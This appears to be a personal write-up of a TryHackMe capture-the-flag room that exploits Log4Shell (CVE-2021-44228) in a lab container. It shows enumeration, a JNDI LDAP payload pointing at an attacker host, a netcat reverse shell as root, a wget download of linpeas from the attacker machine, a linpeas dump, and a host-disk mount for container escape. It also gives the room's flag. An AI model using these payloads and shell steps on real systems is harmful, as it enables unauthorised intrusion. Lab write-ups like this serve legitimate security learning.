<h1 align="center">Lumberjack Turtle</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/6758923c-1993-4e05-8a81-dc9a9523cd37"><br>
July 3, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>423</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>No logs, no crime... so says the lumberjack.</em>.<br>
Access it <a href="https://tryhackme.com/room/lumberjackturtle"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/7b9c5e12-1079-4b5e-8d8f-be5be06de26b"></p>


<br>

<h2>Task 1 . Deploy your target</h2>

<br>

<h2>Task 2 . Challenge</h2>

<h3>Nmap</h3>
<p>
  
- <code>22/ssh/OpenSSH 7.6p1</code><br>
- <code>80/nagios-nsca</code></p>

```bash
:~/LumberjackTurtle# git clone https://github.com/mbechler/marshalsec
Cloning into 'marshalsec'...
remote: Enumerating objects: 186, done.
remote: Counting objects: 100% (43/43), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 186 (delta 35), reused 28 (delta 28), pack-reused 143 (from 3)
Receiving objects: 100% (186/186), 481.95 KiB | 26.77 MiB/s, done.
Resolving deltas: 100% (91/91), done.
:~/LumberjackTurtle/marshalsec# sudo apt install maven
Reading package lists... Done
Building dependency tree       
...
:~/LumberjackTurtle/marshalsec# mvn clean package -DskipTests
...
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  48.390 s

```

<h3>dirb</h3>

<p>

- <code>/~logs</code><br>
- <code>/error</code></p>

```bash
:~/LumberjackTurtle# dirb http://lumberjackturtle.thm
...
URL_BASE: http://lumberjackturtle.thm/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://lumberjackturtle.thm/ ----
+ http://lumberjackturtle.thm/~logs (CODE:200|SIZE:29)                                                                                                                  
+ http://lumberjackturtle.thm/error (CODE:500|SIZE:73)                                                                                                                  
```

<p>- <code>/log4j</code></p>

```bash
:~/LumberjackTurtle# dirb http://lumberjackturtle.thm/~logs
...
URL_BASE: http://lumberjackturtle.thm/~logs/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                                                                           

---- Scanning URL: http://lumberjackturtle.thm/~logs/ ----
+ http://lumberjackturtle.thm/~logs/log4j (CODE:200|SIZE:47)                                                                                                           
```

```bash
:~/LumberjackTurtle# dirsearch -u http://lumberjackturtle.thm/~logs/ -w /usr/share/dirb/wordlists/common.txt

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4613

Output File: /root/LumberjackTurtle/reports/http_lumberjackturtle.thm/_~logs__25-07-03_23-30-45.txt

Target: http://lumberjackturtle.thm/

[...] Starting: ~logs/
[...] 200 -   47B  - /~logs/log4j

Task Completed
                                                                                                    
```

<p>- <code>/log4j</code></p>

```bash
:~/LumberjackTurtle# dirb http://lumberjackturtle.thm/~logs
...
URL_BASE: http://lumberjackturtle.thm/~logs/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                                                                           

---- Scanning URL: http://lumberjackturtle.thm/~logs/ ----
+ http://lumberjackturtle.thm/~logs/log4j (CODE:200|SIZE:47)                                                                                                           
```

<br>

<h3>lumberjackturtle.thm/~logs/log4j</h3>

![image](https://github.com/user-attachments/assets/a59bbf10-beba-49fa-a293-f999ef8ed5b9)

![image](https://github.com/user-attachments/assets/b4da8e28-bc2f-4c1c-8140-5cc9d5486582)

<p>Forward</p>

![image](https://github.com/user-attachments/assets/85a9c80e-6ba8-45de-9a9d-cb2a0f24176a)

<p>Identified IP adress and Port.<br>

<br>

<h3>JNDI Exploit Kit</h3>

```bash
:~/LumberjackTurtle/log4j-shell-poc# python3 poc.py --userip AttackIP --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://AttackIP:1389/a}
[+] Starting Webserver on port 8000 http://0.0.0.0:8000

Listening on 0.0.0.0:1389
```

```bash
:~/LumberjackTurtle/JNDI-Exploit-Kit# rlwrap nc -lnvp 9001
Listening on 0.0.0.0 9001
```

![image](https://github.com/user-attachments/assets/bf1f18b0-19af-4998-b895-db033d904801)


```bash
:~/LumberjackTurtle/log4j-shell-poc# python3 poc.py --userip AttackIP --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.14.141:1389/a}
[+] Starting Webserver on port 8000 http://0.0.0.0:8000

Listening on 0.0.0.0:1389
Send LDAP reference result for a redirecting to http://AttackIP:8000/Exploit.class
10.10.121.55 - - [04/Jul/2025 ...] "GET /Exploit.class HTTP/1.1" 200 -
```

```bash
:~/LumberjackTurtle/JNDI-Exploit-Kit# rlwrap nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on TargetIP 59028
```


<br>

![image](https://github.com/user-attachments/assets/a9ddb3e9-3f99-4cc7-82c4-b39e7874947a)

```bash
:~/LumberjackTurtle/JNDI-Exploit-Kit# rlwrap nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on TargetIP 59028
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
whoami
root
pwd
/
ls /root
which python3
```

```bash
script /dev/null -c bash
Script started, file is /dev/null
```

```bash
bash-4.4# ls -lah
ls -lah
total 68
drwxr-xr-x    1 root     root        4.0K Dec 13  2021 .
drwxr-xr-x    1 root     root        4.0K Dec 13  2021 ..
-rwxr-xr-x    1 root     root           0 Dec 13  2021 .dockerenv
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 app
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 bin
drwxr-xr-x   12 root     root        3.7K Jul  3 21:40 dev
drwxr-xr-x    1 root     root        4.0K Dec 13  2021 etc
drwxr-xr-x    2 root     root        4.0K Dec 20  2018 home
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 lib
drwxr-xr-x    5 root     root        4.0K Dec 20  2018 media
drwxr-xr-x    2 root     root        4.0K Dec 20  2018 mnt
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 opt
dr-xr-xr-x  171 root     root           0 Jul  3 21:40 proc
drwx------    2 root     root        4.0K Dec 20  2018 root
drwxr-xr-x    2 root     root        4.0K Dec 20  2018 run
drwxr-xr-x    1 root     root        4.0K Dec 11  2021 sbin
drwxr-xr-x    2 root     root        4.0K Dec 20  2018 srv
dr-xr-xr-x   13 root     root           0 Jul  3 21:40 sys
drwxrwxrwt    1 root     root        4.0K Jul  3 21:40 tmp
drwxr-xr-x    1 root     root        4.0K Dec 21  2018 usr
drwxr-xr-x    1 root     root        4.0K Dec 20  2018 var
```

```bash
find / -iname "*flag*"
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/opt/.flag1
bash-4.4# cat /opt/.flag1
cat /opt/.flag1
THM{LOG4SHELL_FTW}
```

```bash
bash-4.4# wget http://AttackIP:9494/linpeas.sh
...
linpeas.sh           100% |*******************************|   227k  0:00:00 ETA
bash-4.4# chmod +x linpes.sh
chmod +x linpes.sh
chmod: linpes.sh: No such file or directory
```

```bash
bash-4.4# ./linpeas.sh
...
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username

  YOU ARE ALREADY ROOT!!! (it could take longer to complete execution)


====================================( Basic information )=====================================
OS: Linux version 5.15.0-139-generic (buildd@lcy02-amd64-067) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025
User & Groups: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
Hostname: 81fbbf1def70

[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)n[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)n

Caching directories . . . . . . . . . . . . . . . . . . . . DONE
====================================( System Information )====================================
[+] Operative systemn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploitsnLinux version 5.15.0-139-generic (buildd@lcy02-amd64-067) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025

[+] Sudo versionnsudo Not Found

[+] PATHn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpathn/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin

[+] DatenFri Jul  4 01:31:15 UTC 2025

[+] System statsnFilesystem                Size      Used Available Use% Mounted on
overlay                  38.7G      4.7G     34.0G  12% /
tmpfs                    64.0M         0     64.0M   0% /dev
tmpfs                   965.9M         0    965.9M   0% /sys/fs/cgroup
shm                      64.0M    228.0K     63.8M   0% /dev/shm
/dev/nvme0n1p1           38.7G      4.7G     34.0G  12% /etc/resolv.conf
/dev/nvme0n1p1           38.7G      4.7G     34.0G  12% /etc/hostname
/dev/nvme0n1p1           38.7G      4.7G     34.0G  12% /etc/hosts
             total       used       free     shared    buffers     cached
Mem:       1978180    1333364     644816       1324      23444     745792
-/+ buffers/cache:     564128    1414052
Swap:            0          0          0

[+] Environmentn[i] Any private information inside environment variables?nHISTFILESIZE=0
JAVA_ALPINE_VERSION=8.181.13-r0
HOSTNAME=81fbbf1def70
LD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjdk/jre/../lib/amd64
SHLVL=4
HOME=/root
JAVA_VERSION=8u181
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
LANG=C.UTF-8
HISTSIZE=0
JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk
HISTFILE=/dev/null

[+] Searching Signature verification failed in dmsegn Not Found

[+] AppArmor enabled? .............. AppArmor Not Found
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found
[+] Execshield enabled? ............ Execshield Not Found
[+] SELinux enabled? ............... sestatus Not Found
[+] Is ASLR enabled? ............... Yes
[+] Printer? ....................... lpstat Not Found
[+] Is this a container? ........... Looks like we're in a Docker container
[+] Any running containers? ........ No


=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)n
[+] Unmounted file-system?n[i] Check if you can mount umounted devicesn

====================================( Available Software )====================================
[+] Useful softwaren/usr/bin/nc
/usr/bin/wget
/bin/ping
/bin/base64

[+] Installed Compilern

================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processesn[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processesn    1 root      1:55 java -jar /app/spring-boot-application.jar
   45 root      0:00 /bin/sh
   52 root      0:00 script /dev/null -c bash
   53 root      0:00 bash
   74 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
  559 root      0:00 ps aux
  560 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
  561 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
  565 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
  566 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
  567 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
  568 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
  569 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
  570 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
PID   USER     TIME  COMMAND

[+] Binary processes permissionsn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processesn
[+] Cron jobsn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobsn# do daily/weekly/monthly maintenance
# min	hour	day	month	weekday	command
*/15	*	*	*	*	run-parts /etc/periodic/15min
0	*	*	*	*	run-parts /etc/periodic/hourly
0	2	*	*	*	run-parts /etc/periodic/daily
0	3	*	*	6	run-parts /etc/periodic/weekly
0	5	1	*	*	run-parts /etc/periodic/monthly

total 12
drwxr-xr-x    2 root     root          4096 Dec 20  2018 .
drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..
-rw-------    1 root     root           283 Jun  7  2018 root
# do daily/weekly/monthly maintenance
# min	hour	day	month	weekday	command
*/15	*	*	*	*	run-parts /etc/periodic/15min
0	*	*	*	*	run-parts /etc/periodic/hourly
0	2	*	*	*	run-parts /etc/periodic/daily
0	3	*	*	6	run-parts /etc/periodic/weekly
0	5	1	*	*	run-parts /etc/periodic/monthly


[+] Servicesn[i] Search for outdated versionsnservice|chkconfig|rc-status Not Found

[+] Systemd PATHn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-pathn
[+] Analyzing .service filesn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#servicesnYou can't write on systemd PATH so I'm not going to list relative paths executed by services

[+] System timersn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timersn
[+] Analyzing .timer filesn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timersn
[+] Analyzing .socket filesn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#socketsn
[+] HTTP socketsn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#socketsn
[+] D-Bus config filesn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-busn
[+] D-Bus Service Objects listn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-busn./linpeas.sh: line 1173: busctl: not found
busctl Not Found


+] Hostname, hosts and DNSn
[+] Content of /etc/inetd.conf & /etc/xinetd.confn/etc/inetd.conf Not Found

[+] Networks and neighboursneth0      Link encap:Ethernet  HWaddr 46:3D:96:D6:86:78  
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:92419 errors:0 dropped:0 overruns:0 frame:0
          TX packets:90458 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:14076391 (13.4 MiB)  TX bytes:19635936 (18.7 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-172-17-0-1.e 0.0.0.0         UG    0      0        0 eth0
172.17.0.0      *               255.255.0.0     U     0      0        0 eth0

[+] Iptables rulesniptables rules Not Found

[+] Active Portsn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-portsnActive Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 :::8080                 :::*                    LISTEN      1/java
tcp        1      0 ::ffff:172.17.0.2:8080  ::ffff:10.10.14.141:37908 CLOSE_WAIT  1/java
tcp        0    204 ::ffff:172.17.0.2:59028 ::ffff:10.10.14.141:9001 ESTABLISHED 1/java
tcp        0      0 ::ffff:172.17.0.2:57620 ::ffff:10.10.14.141:1389 ESTABLISHED 1/java

[+] Can I sniff with tcpdump?nNo


===================================( Users Information )=====================================
[+] My usern[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groupsnuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

[+] Do I have PGP keys?ngpg Not Found

[+] Clipboard or highlighted text?nxsel and xclip Not Found

[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.dn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commandsn
[+] Checking /etc/doas.confn/etc/doas.conf Not Found

[+] Checking Pkexec policyn
[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)n[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!n
[+] Superusersnroot:x:0:0:root:/root:/bin/ash

[+] Users with consolenoperator:x:11:0:operator:/root:/bin/sh
postgres:x:70:70::/var/lib/postgresql:/bin/sh
root:x:0:0:root:/root:/bin/ash

[+] All users & groupsnuid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
uid=1(bin) gid=1(bin) groups=1(bin),1(bin),2(daemon),3(sys)
uid=10(uucp) gid=14(uucp) groups=14(uucp),14(uucp)
uid=11(operator) gid=0(root) groups=0(root)
uid=123(ntp) gid=123(ntp) groups=123(ntp)
uid=13(man) gid=15(man) groups=15(man),15(man)
uid=14(postmaster) gid=12(mail) groups=12(mail)
uid=16(cron) gid=16(cron) groups=16(cron),16(cron)
uid=2(daemon) gid=2(daemon) groups=2(daemon),1(bin),2(daemon),4(adm)
uid=209(smmsp) gid=209(smmsp) groups=209(smmsp),209(smmsp)
uid=21(ftp) gid=21(ftp) groups=21(ftp)
uid=22(sshd) gid=22(sshd) groups=22(sshd)
uid=25(at) gid=25(at) groups=25(at),25(at)
uid=3(adm) gid=4(adm) groups=4(adm),3(sys),4(adm),6(disk)
uid=31(squid) gid=31(squid) groups=31(squid),31(squid)
uid=33(xfs) gid=33(xfs) groups=33(xfs),33(xfs)
uid=35(games) gid=35(games) groups=35(games),100(users)
uid=4(lp) gid=7(lp) groups=7(lp),7(lp)
uid=405(guest) gid=100(users) groups=100(users)
uid=5(sync) gid=0(root) groups=0(root)
uid=6(shutdown) gid=0(root) groups=0(root)
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
uid=7(halt) gid=0(root) groups=0(root)
uid=70(postgres) gid=70(postgres) groups=70(postgres)
uid=8(mail) gid=12(mail) groups=12(mail),12(mail)
uid=85(cyrus) gid=12(mail) groups=12(mail)
uid=89(vpopmail) gid=89(vpopmail) groups=89(vpopmail)
uid=9(news) gid=13(news) groups=13(news),13(news)

[+] Login nown
[+] Last logonsn
[+] Last time logon each usern
[+] Password policyn/etc/login.defs Not Found


==================================( Software Information )===================================
[+] MySQL versionnmysql Not Found

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Searching mysql credentials and execn Not Found

[+] PostgreSQL version and pgadmin credentialsn Not Found

[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No

[+] Apache server infon Not Found

[+] Searching PHPCookiesn Not Found

[+] Searching Wordpress wp-config.php filesnwp-config.php Not Found

[+] Searching Drupal settings.php filesn/default/settings.php Not Found

[+] Searching Tomcat users filentomcat-users.xml Not Found

[+] Mongo informationn Not Found

[+] Searching supervisord configuration filensupervisord.conf Not Found

[+] Searching cesi configuration filencesi.conf Not Found

[+] Searching Rsyncd config filenrsyncd.conf Not Found
[+] Searching Hostapd config filenhostapd.conf Not Found

[+] Searching wifi conns filen Not Found

[+] Searching Anaconda-ks config filesnanaconda-ks.cfg Not Found

[+] Searching .vnc directories and their passwd filesn.vnc Not Found

[+] Searching ldap directories and their hashesnldap Not Found

[+] Searching .ovpn files and credentialsn.ovpn Not Found

[+] Searching ssl/ssh filesn
[+] Searching unexpected auth lines in /etc/pam.d/sshdnNo

[+] Searching Cloud credentials (AWS, Azure, GC)n
[+] NFS exports?n[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pen/etc/exports Not Found

[+] Searching kerberos conf files and ticketsn[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-pttntickets kerberos Not Found
klist Not Found

[+] Searching Kibana yamlnkibana.yml Not Found

[+] Searching Knock configurationnKnock.config Not Found

[+] Searching logstash filesn Not Found

[+] Searching elasticsearch filesn Not Found

[+] Searching Vault-ssh filesnvault-ssh-helper.hcl Not Found

[+] Searching AD cached hashesncached hashes Not Found

[+] Searching screen sessionsn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessionsnscreen Not Found

[+] Searching tmux sessionsn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessionsntmux Not Found

[+] Searching Couchdb directoryn
[+] Searching redis.confn
[+] Searching dovecot filesndovecot credentials Not Found

[+] Searching mosquitto.confn
[+] Searching neo4j auth filen
[+] Searching Cloud-Init conf filen
[+] Searching Erlang cookie filen
[+] Searching GVM auth filen
[+] Searching IPSEC filesn

====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write permsn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commandsnYou own the SUID file: /bin/umount
You own the SUID file: /bin/mount

[+] SGIDn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commandsnYou can write SUID file: /usr/bin/wall

[+] Writable folders configured in /etc/ld.so.conf.d/n[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-dn
[+] Capabilitiesn[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilitiesn
[+] Users with capabilitiesn/etc/security/capability.conf Not Found

[+] Files with ACLsnfiles with acls in searched folders Not Found

[+] .sh files in pathn
[+] Unexpected folders in rootn/app

[+] Files (scripts) in /etc/profile.d/ntotal 16
drwxr-xr-x    1 root     root          4096 Dec 21  2018 .
drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..
-rw-r--r--    1 root     root           295 Jun  7  2018 color_prompt
-rw-r--r--    1 root     root           545 Jun 17  2018 freetype.sh

[+] Hashes inside passwd file? ........... No
[+] Hashes inside group file? ............ No
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. root:::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
postgres:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
[+] Can I read root folder? .............. total 8
drwx------    2 root     root          4096 Dec 20  2018 .
drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..

[+] Searching root files in home dirs (limit 20)n/home

[+] Modified interesting files in the last 5mins (limit 100)n/tmp/linpeas.sh
/tmp/hsperfdata_root/1

[+] Writable log files (logrotten) (limit 100)n[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitationn
[+] Files inside /root (limit 20)ntotal 8
drwx------    2 root     root          4096 Dec 20  2018 .
drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..

[+] Files inside others home (limit 20)n
[+] Searching installed mail applicationsnls: /usr/local/sbin: No such file or directory
sendmail

[+] Mails (limit 50)n
[+] Backup files?n
[+] Searching tables inside readable .db/.sqlite files (limit 100)n
[+] Web files?(output limit)n
[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.ymln[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-datan
[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)n-rwxr-xr-x    1 root     root             0 Dec 13  2021 /.dockerenv
-rw-r--r--    1 root     root            19 Dec 11  2021 /opt/.flag1

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)n-rwxr-xr-x    1 root     root        233380 Jul  4 01:30 /tmp/linpeas.sh
-rw-------    1 root     root         32768 Jul  4 01:31 /tmp/hsperfdata_root/1

[+] Searching passwords in config PHP filesn
[+] Finding IPs inside logs (limit 70)n
[+] Finding passwords inside logs (limit 70)n
[+] Finding emails inside logs (limit 70)n
[+] Finding *password* or *credential* files in home (limit 70)n
[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)n
[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)n
[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)n
[+] Searching specific hashes inside files - less false positives (limit 70)n
```

```bash
bash-4.4# fdisk -l
fdisk -l
Disk /dev/nvme0n1: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes
Disklabel type: dos
Disk identifier: 0x3650a2cc

Device         Boot Start      End  Sectors Size Id Type
/dev/nvme0n1p1 *     2048 83886046 83883999  40G 83 Linux


Disk /dev/nvme1n1: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes


Disk /dev/nvme2n1: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes
```

```bash
bash-4.4# mount /dev/nvme0n1p1 /tmp/root_
mount /dev/nvme0n1p1 /tmp/root_
```

```bash
bash-4.4# ls -lah
ls -lah
total 128
drwxr-xr-x   22 root     root        4.0K Jul  3 21:39 .
drwxrwxrwt    1 root     root        4.0K Jul  4 01:37 ..
-rw-r--r--    1 root     root         198 Jul  3 21:39 .badr-info
drwxr-xr-x    2 root     root       12.0K Jun  5 18:07 bin
drwxr-xr-x    3 root     root        4.0K Jul  3 21:52 boot
drwxr-xr-x    4 root     root        4.0K Dec  8  2021 dev
drwxr-xr-x  107 root     root       12.0K Jul  3 21:39 etc
drwxr-xr-x    4 root     root        4.0K May 25 15:58 home
lrwxrwxrwx    1 root     root          34 Apr 26 23:15 initrd.img -> boot/initrd.img-4.15.0-213-generic
